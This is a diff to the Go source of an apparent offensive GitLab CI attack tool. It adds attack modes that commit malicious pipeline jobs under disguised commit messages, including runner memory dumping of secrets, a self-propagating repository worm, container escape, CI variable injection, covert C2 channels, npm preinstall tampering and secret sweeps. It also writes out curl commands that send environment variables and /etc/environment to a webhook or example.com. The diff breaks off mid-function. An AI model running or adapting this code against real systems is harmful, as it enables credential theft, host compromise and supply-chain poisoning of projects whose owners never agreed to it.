@@ -7,6 +7,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"maps"
 	"os"
 	"path/filepath"
 	"strings"
@@ -14,7 +15,7 @@ import (
 
 	"github.com/mr-pmillz/gogatoz/pkg/attack"
 	payloadgen "github.com/mr-pmillz/gogatoz/pkg/attack/payloads"
-	ror "github.com/mr-pmillz/gogatoz/pkg/attack/ror"
+	rorpkg "github.com/mr-pmillz/gogatoz/pkg/attack/ror"
 	"github.com/mr-pmillz/gogatoz/pkg/attack/scriptinject"
 	secdump "github.com/mr-pmillz/gogatoz/pkg/attack/secretsdump"
 	"github.com/mr-pmillz/gogatoz/pkg/attack/tamper"
@@ -22,6 +23,7 @@ import (
 	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
 	"github.com/mr-pmillz/gogatoz/pkg/pivot"
 	"github.com/spf13/cobra"
+	gitlab "gitlab.com/gitlab-org/api/client-go"
 )
 
 const (
@@ -175,6 +177,67 @@ var (
 	// LOTP injection mode (Living off the Pipeline)
 	atkLOTPInject bool   // commit weaponized LOTP config to branch
 	atkLOTPTool   string // target tool: npm-gyp, npm, make, pytest, goreleaser, gradle, terraform
+	// ROR shell listener mode (built-in callback server for ror-shell exfil)
+	atkRorListen        bool   // start a built-in listener for ror-shell exfil callbacks
+	atkRorListenAddr    string // listen address (default ":9444")
+	atkRorListenTimeout string // timeout for listening (default "10m")
+	// Memory dump mode (extract secrets from runner process memory via /proc)
+	atkMemoryDump       bool
+	atkMemoryDumpProc   string // /proc/<pid> to dump (auto-detect if empty)
+	atkMemoryDumpFilter string // regex to filter variables (default: .*SECRET|.*TOKEN|.*KEY)
+	// Supply chain worm mode (self-propagating CI injection)
+	atkSupplyChainWorm bool
+	atkWormPayload     string // payload to inject into sibling repos
+	atkWormMaxRepos    int    // max sibling repos to propagate to (default: 5)
+	atkWormTargetGroup string // group ID/path to scope worm propagation
+	// Container escape mode (privileged Docker executor exploit)
+	atkContainerEscape bool
+	atkEscapeMountPath string // host path to mount (default: /)
+	atkEscapeMethod    string // sshd|docker|kernel|nsenter (default: sshd)
+	atkEscapeCommand   string // command to execute on host (default: bash)
+	// Variable injection mode (CI/Group variable takeover)
+	atkVariableInject  bool
+	atkInjectVars      string // JSON string of var key=value pairs to inject
+	atkInjectScope     string // project|group (default: project)
+	atkInjectGroupID   string // group ID for group-scope injection
+	atkInjectProtected bool   // inject as protected variable
+	atkInjectMasked    bool   // inject as masked variable
+	// C2 covert channel mode (DNS tunnel, steganography, ICMP)
+	atkC2Channel     bool
+	atkC2Method      string // dns-a|dns-txt|steg-wav|steg-png|icmp (default: dns-a)
+	atkC2Target      string // domain/URL for the C2 channel
+	atkC2KeepAlive   bool   // keep C2 channel alive with heartbeats
+	atkC2CallbackURL string // C2 callback URL
+	// npm tamper mode (supply chain npm package poisoning)
+	atkNpmTamper       bool
+	atkNpmRegistry     string // npm registry URL
+	atkNpmPackage      string // specific package to tamper
+	atkNpmInjectScript string // preinstall hook content
+	// Vault enumeration mode (HashiCorp Vault secrets sweep)
+	atkVaultEnum       bool
+	atkVaultAddr       string // Vault server URL
+	atkVaultAuthMethod string // token|kubernetes|aws
+	// K8s secrets sweep mode (Kubernetes RBAC exploit)
+	atkK8sSecrets    bool
+	atkK8sNamespaces string // comma-separated namespaces
+	// Dead Man's Switch mode (persistence with revocation detection)
+	atkDeadManSwitch bool
+	atkDMSMonitorURL string // endpoint to probe
+	atkDMSInterval   string // check interval seconds
+	atkDMSTTL        string // TTL before self-removal
+	atkDMSHandler    string // command on revocation
+	atkDMSPlatform   string // linux|macos
+	// Branch mutator mode (mass branch CI poisoning)
+	atkBranchMutator      bool
+	atkMutatorFile        string // file to create/update on each branch
+	atkMutatorContent     string // content to write
+	atkMutatorMaxBranches int    // max branches to target
+	// Sigstore provenance forgery mode
+	atkSigstore        bool
+	atkSigstorePackage string // package name for attestation
+	atkSigstoreVersion string // package version
+	// Shared co-author trailer
+	atkCoAuthor string // co-authored-by trailer for commits
 )
 
 // narrow interface to allow test fakes
@@ -356,8 +419,44 @@ var attackCmd = &cobra.Command{
 			if atkLOTPInject {
 				modes++
 			}
+			if atkRorListen {
+				modes++
+			}
+			if atkMemoryDump {
+				modes++
+			}
+			if atkSupplyChainWorm {
+				modes++
+			}
+			if atkContainerEscape {
+				modes++
+			}
+			if atkVariableInject {
+				modes++
+			}
+			if atkC2Channel {
+				modes++
+			}
+			if atkNpmTamper {
+				modes++
+			}
+			if atkVaultEnum {
+				modes++
+			}
+			if atkK8sSecrets {
+				modes++
+			}
+			if atkDeadManSwitch {
+				modes++
+			}
+			if atkBranchMutator {
+				modes++
+			}
+			if atkSigstore {
+				modes++
+			}
 			if modes != 1 {
-				return fmt.Errorf("select exactly one mode: --commit-ci, --secrets, --cleanup, --deploy-key, --add-member, --ai-inject, --inject-script, --lotp-inject, --auto-merge, --tamper-release, --tamper-package, --tamper-tag, or --harvest (or use --payload-only or --discover-tags)")
+				return fmt.Errorf("select exactly one mode: --commit-ci, --secrets, --cleanup, --deploy-key, --add-member, --ai-inject, --inject-script, --lotp-inject, --auto-merge, --tamper-release, --tamper-package, --tamper-tag, --harvest, --ror-listen, --memory-dump, --supply-chain-worm, --container-escape, --variable-inject, --c2-channel, --npm-tamper, --vault-enum, --k8s-secrets, --dead-man-switch, --branch-mutator, or --sigstore (or use --payload-only or --discover-tags)")
 			}
 		}
 
@@ -428,12 +527,12 @@ var attackCmd = &cobra.Command{
 
 		// Discovery: list runner tags and exit
 		if atkDiscoverTags {
-			tags, _, err := ror.DiscoverProjectRunnerTags(ctx, client, atkTarget)
+			tags, _, err := rorpkg.DiscoverProjectRunnerTags(ctx, client, atkTarget)
 			if err != nil {
 				return err
 			}
 			if strings.TrimSpace(atkExecutor) != "" {
-				tags = ror.FilterTagsByExecutor(tags, atkExecutor)
+				tags = rorpkg.FilterTagsByExecutor(tags, atkExecutor)
 			}
 			if outputJSON {
 				// print as simple JSON array
@@ -776,7 +875,7 @@ var attackCmd = &cobra.Command{
 			// Build and commit git-hook payload
 			var tags []string
 			if strings.TrimSpace(atkTags) != "" {
-				for _, t := range strings.Split(atkTags, ",") {
+				for t := range strings.SplitSeq(atkTags, ",") {
 					t = strings.TrimSpace(t)
 					if t != "" {
 						tags = append(tags, t)
@@ -1023,11 +1122,30 @@ var attackCmd = &cobra.Command{
 				return fmt.Errorf("--script-payload or --script-payload-file is required for --inject-script")
 			}
 
+			// Branch handling
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = attack.GogatozAttacks
+			}
+			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
+			if berr != nil {
+				return berr
+			}
+
+			// Fetch the project to determine the default branch for CI config detection
+			var defaultBranch string
+			p, _, perr := client.GL.Projects.GetProject(atkTarget, &gitlab.GetProjectOptions{}, gitlab.WithContext(ctx))
+			if perr == nil && p != nil {
+				defaultBranch = p.DefaultBranch
+			}
+			if defaultBranch == "" {
+				defaultBranch = "main"
+			}
+
 			// Determine target script path
 			scriptPath := strings.TrimSpace(atkScriptPath)
 			if scriptPath == "" {
-				// Auto-detect: fetch CI config and extract script references
-				content, ferr := att.GetFileContent(ctx, atkTarget, "", ".gitlab-ci.yml")
+				// Auto-detect: fetch CI config from the default branch and extract script references
+				content, ferr := att.GetFileContent(ctx, atkTarget, defaultBranch, ".gitlab-ci.yml")
 				if ferr != nil {
 					return fmt.Errorf("fetch .gitlab-ci.yml for script detection: %w", ferr)
 				}
@@ -1043,22 +1161,14 @@ var attackCmd = &cobra.Command{
 				fmt.Fprintf(cmd.ErrOrStderr(), "[attack] auto-detected script: %s (from job %q)\n", scriptPath, refs[0].JobName)
 			}
 
-			// Branch handling
-			if strings.TrimSpace(atkBranch) == "" {
-				atkBranch = attack.GogatozAttacks
-			}
-			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
-			if berr != nil {
-				return berr
-			}
 			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
 				return err
 			}
 
-			// Fetch original file content
-			original, ferr := att.GetFileContent(ctx, atkTarget, finalBranch, scriptPath)
+			// Fetch original file content from the default branch
+			original, ferr := att.GetFileContent(ctx, atkTarget, defaultBranch, scriptPath)
 			if ferr != nil {
-				return fmt.Errorf("fetch %s: %w", scriptPath, ferr)
+				return fmt.Errorf("fetch %s from %s: %w", scriptPath, defaultBranch, ferr)
 			}
 
 			// Inject payload
@@ -1177,12 +1287,806 @@ var attackCmd = &cobra.Command{
 			return nil
 		}
 
+		// ror-shell listener mode: start a callback server, commit ror-shell payload, wait for exfil
+		if atkRorListen {
+			// ror-listen is always ror-shell payload
+			atkPayload = "ror-shell"
+			if strings.TrimSpace(atkTarget) == "" {
+				return fmt.Errorf("--ror-listen requires --target")
+			}
+			if strings.TrimSpace(atkWebhook) == "" {
+				return fmt.Errorf("--webhook is required for --ror-listen (external URL reachable from runners)")
+			}
+
+			// Start the listener
+			listenAddr := strings.TrimSpace(atkRorListenAddr)
+			if listenAddr == "" {
+				listenAddr = "127.0.0.1:9444"
+			}
+			listenTimeout, terr := time.ParseDuration(strings.TrimSpace(atkRorListenTimeout))
+			if terr != nil || listenTimeout <= 0 {
+				listenTimeout = 10 * time.Minute
+			}
+
+			listener := newRorShellListener(listenAddr, cmd.OutOrStdout())
+			listenErrCh := make(chan error, 1)
+			go func() {
+				listenErrCh <- listener.Run(ctx)
+			}()
+
+			// Wait for the listener to be ready or fail
+			select {
+			case <-listener.Ready():
+				// bound successfully
+			case err := <-listenErrCh:
+				return fmt.Errorf("ror-listener failed to start: %w", err)
+			case <-time.After(5 * time.Second):
+				return fmt.Errorf("ror-listener startup timeout")
+			}
+			actualAddr := listener.Addr()
+
+			// Build the ror-shell webhook URL (reachable from runners)
+			webhookURL := strings.TrimSpace(atkWebhook)
+			if webhookURL == "" {
+				webhookURL = fmt.Sprintf("http://%s/callback", strings.TrimPrefix(actualAddr, "["))
+			}
+
+			// Build the ror-shell command that sends env dump to the webhook
+			rorCmd := strings.TrimSpace(atkCmd)
+			if rorCmd == "" {
+				// Default: execute a basic command AND send results to the listener
+				rorCmd = fmt.Sprintf(`printenv | tee .env_dump; curl -sS --max-time 30 -d "$(cat .env_dump | base64 -w0)" "%s/callback" || true`, webhookURL)
+			} else {
+				// User provided a custom cmd: also send it to the listener
+				rorCmd = fmt.Sprintf(`%s; curl -sS --max-time 30 -d "$(printenv | base64 -w0)" "%s/callback" || true`, rorCmd, webhookURL)
+			}
+
+			// Override atkWebhook so renderPayload picks it up
+			savedWebhook := atkWebhook
+			atkWebhook = webhookURL
+			// Override atkCmd so renderPayload uses the right command
+			savedCmd := atkCmd
+			atkCmd = rorCmd
+			// Also set default tags for ror-listen so the job can be scheduled
+			savedTags := atkTags
+			if strings.TrimSpace(atkTags) == "" {
+				atkTags = "shell_executor"
+			}
+
+			// Re-render the payload with our webhook
+			yaml, err := renderPayload()
+			if err != nil {
+				_ = listener.Stop(ctx)
+				return fmt.Errorf("render ror-shell payload: %w", err)
+			}
+
+			// Restore saved values
+			atkWebhook = savedWebhook
+			atkCmd = savedCmd
+			atkTags = savedTags
+
+			// Proceed with the commit-ci flow
+			atkCommitCI = true
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-ror-listen"
+			}
+			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
+			if berr != nil {
+				_ = listener.Stop(ctx)
+				return berr
+			}
+			att := newAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+			pipelineURL, cerr := att.CommitCIPipeline(ctx, atkTarget, finalBranch, yaml, "Execute runner command via GoGatoZ")
+			if cerr != nil {
+				_ = listener.Stop(ctx)
+				return fmt.Errorf("commit ror-shell payload: %w", cerr)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[ror-listener] pipeline: %s\n", pipelineURL)
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Pipeline committed: %s", pipelineURL))
+			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Listener active on %s", actualAddr))
+			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Waiting for exfiltrated data (timeout: %s)...", listenTimeout))
+
+			// Wait for callbacks
+			results, werr := listener.WaitFor(ctx, listenTimeout)
+			if werr != nil {
+				fmt.Fprintf(cmd.ErrOrStderr(), "[ror-listener] wait: %v\n", werr)
+			}
+
+			// Display results
+			if len(results) > 0 {
+				renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Received %d callback(s)", len(results)))
+				for i, r := range results {
+					if i > 0 {
+						fmt.Fprintln(cmd.OutOrStdout())
+					}
+					renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Callback %d — from %s (%d secrets)", i+1, r.Addr, len(r.Secrets)))
+					renderExfilSecrets(cmd.OutOrStdout(), r.Secrets, atkAllVars)
+				}
+				// Save to DB
+				pipelineID, _ := parsePipelineURL(pipelineURL)
+				persistAttackExfil(strings.TrimSpace(gitlabURL), atkTarget, 0, pipelineURL, finalBranch, pipelineURL, pipelineID, 0, resultsToMap(results))
+			} else {
+				renderWarning(cmd.OutOrStdout(), "No data received within timeout — make sure the runner executed the command and sent data to the webhook")
+			}
+
+			// Shutdown listener
+			_ = listener.Stop(ctx)
+			return nil
+		}
+
+		// memory-dump mode: inject a CI job that dumps secrets from runner process memory
+		// (bypasses GitLab masked variables by reading /proc/<pid>/mem or /proc/*/environ)
+		if atkMemoryDump {
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-memory-dump"
+			}
+			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
+			if berr != nil {
+				return berr
+			}
+			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+			if _, err := att.SetupUser(ctx); err != nil {
+				return fmt.Errorf("setup user: %w", err)
+			}
+			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
+				return err
+			}
+			if strings.TrimSpace(atkMessage) == "" {
+				atkMessage = "ci: fix variable resolution"
+			}
+			c2URL := strings.TrimSpace(atkWebhook)
+			var tags []string
+			if strings.TrimSpace(atkTags) != "" {
+				for t := range strings.SplitSeq(atkTags, ",") {
+					t = strings.TrimSpace(t)
+					if t != "" {
+						tags = append(tags, t)
+					}
+				}
+			}
+			payload := payloadgen.GenerateMemoryDumpYAML(payloadgen.MemoryDumpOptions{
+				Common: payloadgen.CommonOptions{
+					JobName: strings.TrimSpace(atkJobName),
+					Stage:   strings.TrimSpace(atkStage),
+					Image:   strings.TrimSpace(atkImage),
+					Tags:    tags,
+					Manual:  atkManual,
+				},
+				CallbackURL:   c2URL,
+				EncryptionKey: strings.TrimSpace(atkTamperTagEncKey),
+				ProcScan:      true,
+				MemoryDump:    true,
+				Extended:      true,
+			})
+			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", payload, atkMessage); err != nil {
+				return fmt.Errorf("commit memory dump payload: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed memory dump payload to branch %s\n", finalBranch)
+			if outputJSON {
+				out := struct {
+					Branch  string `json:"branch"`
+					HasDump bool   `json:"memory_dump"`
+					HasScan bool   `json:"proc_scan"`
+				}{
+					Branch:  finalBranch,
+					HasDump: true,
+					HasScan: true,
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Memory dump payload committed to branch %s", finalBranch))
+			renderInfo(cmd.OutOrStdout(), "This payload will attempt to extract secrets from runner process memory")
+			return nil
+		}
+
+		// supply-chain-worm mode: self-propagating CI injection across sibling repos
+		if atkSupplyChainWorm {
+			wormPayload := strings.TrimSpace(atkWormPayload)
+			if wormPayload == "" {
+				wormPayload = "curl -sS -H 'PRIVATE-TOKEN: $CI_JOB_TOKEN' 'https://example.com/exfil?data=$(base64 /etc/environment)'"
+			}
+			maxRepos := atkWormMaxRepos
+			if maxRepos <= 0 {
+				maxRepos = 5
+			}
+			// Get the project to find its group
+			p, _, perr := client.GL.Projects.GetProject(atkTarget, &gitlab.GetProjectOptions{}, gitlab.WithContext(ctx))
+			if perr != nil {
+				return fmt.Errorf("get project: %w", perr)
+			}
+			groupPath := ""
+			if p.Namespace != nil {
+				groupPath = p.Namespace.FullPath
+			}
+			if groupPath == "" {
+				groupPath = strings.TrimSpace(atkWormTargetGroup)
+			}
+			if groupPath == "" {
+				return fmt.Errorf("--worm-target-group is required when the target project has no group namespace")
+			}
+			result := payloadgen.RunSupplyChainWorm(ctx, client.GL, p.ID, groupPath, wormPayload, maxRepos, atkBranch, atkAuthorName, atkAuthorEmail, cmd.ErrOrStderr())
+			if outputJSON {
+				b, _ := json.MarshalIndent(result, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Supply chain worm propagated to %d repos", result.Promoted))
+			if result.Failed > 0 {
+				renderWarning(cmd.OutOrStdout(), fmt.Sprintf("%d repos failed to inject", result.Failed))
+			}
+			return nil
+		}
+
+		// container-escape mode: exploit privileged Docker executor to escape to host
+		if atkContainerEscape {
+			escapeMethod := strings.ToLower(strings.TrimSpace(atkEscapeMethod))
+			if escapeMethod == "" {
+				escapeMethod = "docker"
+			}
+			escapeCmd := strings.TrimSpace(atkEscapeCommand)
+			if escapeCmd == "" {
+				escapeCmd = "bash"
+			}
+			mountPath := strings.TrimSpace(atkEscapeMountPath)
+			if mountPath == "" {
+				mountPath = "/"
+			}
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-container-escape"
+			}
+			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
+			if berr != nil {
+				return berr
+			}
+			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+			if _, err := att.SetupUser(ctx); err != nil {
+				return fmt.Errorf("setup user: %w", err)
+			}
+			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
+				return err
+			}
+			if strings.TrimSpace(atkMessage) == "" {
+				atkMessage = "build: optimize container runtime"
+			}
+			var tags []string
+			if strings.TrimSpace(atkTags) != "" {
+				for t := range strings.SplitSeq(atkTags, ",") {
+					t = strings.TrimSpace(t)
+					if t != "" {
+						tags = append(tags, t)
+					}
+				}
+			}
+			if len(tags) == 0 {
+				tags = []string{"docker"}
+			}
+			ceImage := strings.TrimSpace(atkImage)
+			if ceImage == "" {
+				ceImage = "docker:dind"
+			}
+			yaml := payloadgen.GenerateContainerEscapeYAML(payloadgen.ContainerEscapeOptions{
+				Common: payloadgen.CommonOptions{
+					JobName:         strings.TrimSpace(atkJobName),
+					Stage:           strings.TrimSpace(atkStage),
+					Image:           ceImage,
+					Tags:            tags,
+					Manual:          atkManual,
+					ArtifactsPath:   strings.TrimSpace(atkArtifactsPath),
+					ArtifactsExpire: strings.TrimSpace(atkArtifactsExpire),
+				},
+				ExfilMethod:  strings.TrimSpace(atkExfilMethod),
+				ExfilTarget:  strings.TrimSpace(atkExfilTarget),
+				EscapeMethod: escapeMethod,
+				EscapeCmd:    escapeCmd,
+				MountPath:    mountPath,
+			})
+			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
+				return fmt.Errorf("commit container escape payload: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed container escape payload to branch %s\n", finalBranch)
+			if outputJSON {
+				out := struct {
+					Branch       string `json:"branch"`
+					EscMethod    string `json:"escape_method"`
+					DockerInDind bool   `json:"docker_in_dind"`
+				}{
+					Branch:       finalBranch,
+					EscMethod:    escapeMethod,
+					DockerInDind: true,
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Container escape payload committed to branch %s", finalBranch))
+			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Method: %s with command: %s", escapeMethod, escapeCmd))
+			renderInfo(cmd.OutOrStdout(), "This job will attempt to escape the container to the host system")
+			return nil
+		}
+
+		// variable-inject mode: inject malicious CI variables into project/group scope
+		if atkVariableInject {
+			if strings.TrimSpace(atkInjectVars) == "" {
+				return fmt.Errorf("--inject-vars is required (JSON: '[{\"key\":\"MY_SECRET\",\"value\":\"val\"}]')")
+			}
+			scope := strings.ToLower(strings.TrimSpace(atkInjectScope))
+			if scope == "" {
+				scope = "project"
+			}
+			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+			type injectVar struct {
+				Key         string `json:"key"`
+				Value       string `json:"value"`
+				Protected   bool   `json:"protected"`
+				Masked      bool   `json:"masked"`
+				Environment string `json:"environment_scope"`
+			}
+			var vars []injectVar
+			if err := json.Unmarshal([]byte(atkInjectVars), &vars); err != nil {
+				return fmt.Errorf("parse --inject-vars JSON: %w", err)
+			}
+			for i := range vars {
+				if atkInjectProtected {
+					vars[i].Protected = true
+				}
+				if atkInjectMasked {
+					vars[i].Masked = true
+				}
+			}
+			results := make([]struct {
+				Key     string `json:"key"`
+				Scope   string `json:"scope"`
+				Success bool   `json:"success"`
+				Error   string `json:"error,omitempty"`
+			}, 0)
+			for _, v := range vars {
+				if v.Key == "" {
+					continue
+				}
+				if scope == "group" {
+					gid := strings.TrimSpace(atkInjectGroupID)
+					if gid == "" {
+						results = append(results, struct {
+							Key     string `json:"key"`
+							Scope   string `json:"scope"`
+							Success bool   `json:"success"`
+							Error   string `json:"error,omitempty"`
+						}{Key: v.Key, Scope: scope, Success: false, Error: "--group-id required for group-scope injection"})
+						continue
+					}
+					_, _, err := att.SetGroupVariable(ctx, gid, v.Key, v.Value, !v.Protected, v.Masked, v.Environment)
+					results = append(results, struct {
+						Key     string `json:"key"`
+						Scope   string `json:"scope"`
+						Success bool   `json:"success"`
+						Error   string `json:"error,omitempty"`
+					}{Key: v.Key, Scope: scope + ":" + gid, Success: err == nil, Error: ifErr(err)})
+				} else {
+					_, _, err := att.SetProjectVariable(ctx, atkTarget, v.Key, v.Value, !v.Protected, v.Masked, v.Environment)
+					results = append(results, struct {
+						Key     string `json:"key"`
+						Scope   string `json:"scope"`
+						Success bool   `json:"success"`
+						Error   string `json:"error,omitempty"`
+					}{Key: v.Key, Scope: scope, Success: err == nil, Error: ifErr(err)})
+				}
+			}
+			if outputJSON {
+				b, _ := json.MarshalIndent(struct {
+					Scope    string `json:"scope"`
+					Injected []struct {
+						Key     string `json:"key"`
+						Scope   string `json:"scope"`
+						Success bool   `json:"success"`
+						Error   string `json:"error,omitempty"`
+					} `json:"injected"`
+				}{
+					Scope: scope,
+					Injected: func() []struct {
+						Key     string `json:"key"`
+						Scope   string `json:"scope"`
+						Success bool   `json:"success"`
+						Error   string `json:"error,omitempty"`
+					} {
+						out := make([]struct {
+							Key     string `json:"key"`
+							Scope   string `json:"scope"`
+							Success bool   `json:"success"`
+							Error   string `json:"error,omitempty"`
+						}, len(results))
+						copy(out, results)
+						return out
+					}(),
+				}, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Injected %d variables into %s scope", len(results), scope))
+			for _, r := range results {
+				if r.Success {
+					renderInfo(cmd.OutOrStdout(), fmt.Sprintf("  ✓ %s (%s)", r.Key, r.Scope))
+				} else {
+					renderError(cmd.OutOrStdout(), fmt.Sprintf("  ✗ %s: %s", r.Key, r.Error))
+				}
+			}
+			return nil
+		}
+
+		// c2-channel mode: establish a covert C2 channel via DNS tunnel, steganography, etc.
+		if atkC2Channel {
+			method := strings.ToLower(strings.TrimSpace(atkC2Method))
+			if method == "" {
+				method = "dns-a"
+			}
+			target := strings.TrimSpace(atkC2Target)
+			if target == "" {
+				return fmt.Errorf("--c2-target is required (domain for DNS tunnel, URL for other methods)")
+			}
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-c2"
+			}
+			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
+			if berr != nil {
+				return berr
+			}
+			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+			if _, err := att.SetupUser(ctx); err != nil {
+				return fmt.Errorf("setup user: %w", err)
+			}
+			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
+				return err
+			}
+			if strings.TrimSpace(atkMessage) == "" {
+				atkMessage = "tools: add network diagnostics"
+			}
+			var tags []string
+			if strings.TrimSpace(atkTags) != "" {
+				for t := range strings.SplitSeq(atkTags, ",") {
+					t = strings.TrimSpace(t)
+					if t != "" {
+						tags = append(tags, t)
+					}
+				}
+			}
+			if len(tags) == 0 {
+				tags = []string{"shell_executor"}
+			}
+			yaml := payloadgen.GenerateC2ChannelYAML(payloadgen.C2ChannelOptions{
+				Common: payloadgen.CommonOptions{
+					JobName: strings.TrimSpace(atkJobName),
+					Stage:   strings.TrimSpace(atkStage),
+					Image:   strings.TrimSpace(atkImage),
+					Tags:    tags,
+					Manual:  atkManual,
+				},
+				ExfilMethod: method,
+				ExfilTarget: target,
+				KeepAlive:   atkC2KeepAlive,
+				CallbackURL: strings.TrimSpace(atkC2CallbackURL),
+			})
+			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
+				return fmt.Errorf("commit C2 channel payload: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed C2 channel payload to branch %s\n", finalBranch)
+			if outputJSON {
+				out := struct {
+					Branch      string `json:"branch"`
+					ChannelType string `json:"c2_method"`
+					Target      string `json:"c2_target"`
+					KeepAlive   bool   `json:"keepalive"`
+				}{
+					Branch:      finalBranch,
+					ChannelType: method,
+					Target:      target,
+					KeepAlive:   atkC2KeepAlive,
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("C2 channel payload committed to branch %s", finalBranch))
+			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Channel type: %s -> %s", method, target))
+			return nil
+		}
+
+		// npm-tamper mode: inject preinstall hooks into npm packages via CI
+		if atkNpmTamper {
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-npm-tamper"
+			}
+			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
+			if berr != nil {
+				return berr
+			}
+			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+			if _, err := att.SetupUser(ctx); err != nil {
+				return fmt.Errorf("setup user: %w", err)
+			}
+			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
+				return err
+			}
+			if strings.TrimSpace(atkMessage) == "" {
+				atkMessage = "build: update npm package configuration"
+			}
+			yaml := payloadgen.GenerateNpmTamperYAML(payloadgen.NpmTamperOptions{
+				Common: payloadgen.CommonOptions{
+					JobName: strings.TrimSpace(atkJobName),
+					Stage:   strings.TrimSpace(atkStage),
+					Image:   strings.TrimSpace(atkImage),
+					Tags:    parseTags(atkTags),
+					Manual:  atkManual,
+				},
+				RegistryURL:    strings.TrimSpace(atkNpmRegistry),
+				PackageName:    strings.TrimSpace(atkNpmPackage),
+				InjectedScript: strings.TrimSpace(atkNpmInjectScript),
+				CallbackURL:    strings.TrimSpace(atkWebhook),
+			})
+			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
+				return fmt.Errorf("commit npm tamper payload: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed npm tamper payload to branch %s\n", finalBranch)
+			if outputJSON {
+				out := struct {
+					Branch   string `json:"branch"`
+					Registry string `json:"registry,omitempty"`
+					Package  string `json:"package,omitempty"`
+				}{
+					Branch:   finalBranch,
+					Registry: strings.TrimSpace(atkNpmRegistry),
+					Package:  strings.TrimSpace(atkNpmPackage),
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("npm tamper payload committed to branch %s", finalBranch))
+			return nil
+		}
+
+		// vault-enum mode: enumerate and exfiltrate HashiCorp Vault secrets
+		if atkVaultEnum { //nolint:dupl // structurally similar to sigstore handler but different YAML generation and JSON output
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-vault-enum"
+			}
+			if strings.TrimSpace(atkMessage) == "" {
+				atkMessage = "ci: add vault integration checks"
+			}
+			yaml := payloadgen.GenerateVaultEnumYAML(payloadgen.VaultEnumOptions{
+				Common: payloadgen.CommonOptions{
+					JobName: strings.TrimSpace(atkJobName),
+					Stage:   strings.TrimSpace(atkStage),
+					Image:   strings.TrimSpace(atkImage),
+					Tags:    parseTags(atkTags),
+					Manual:  atkManual,
+				},
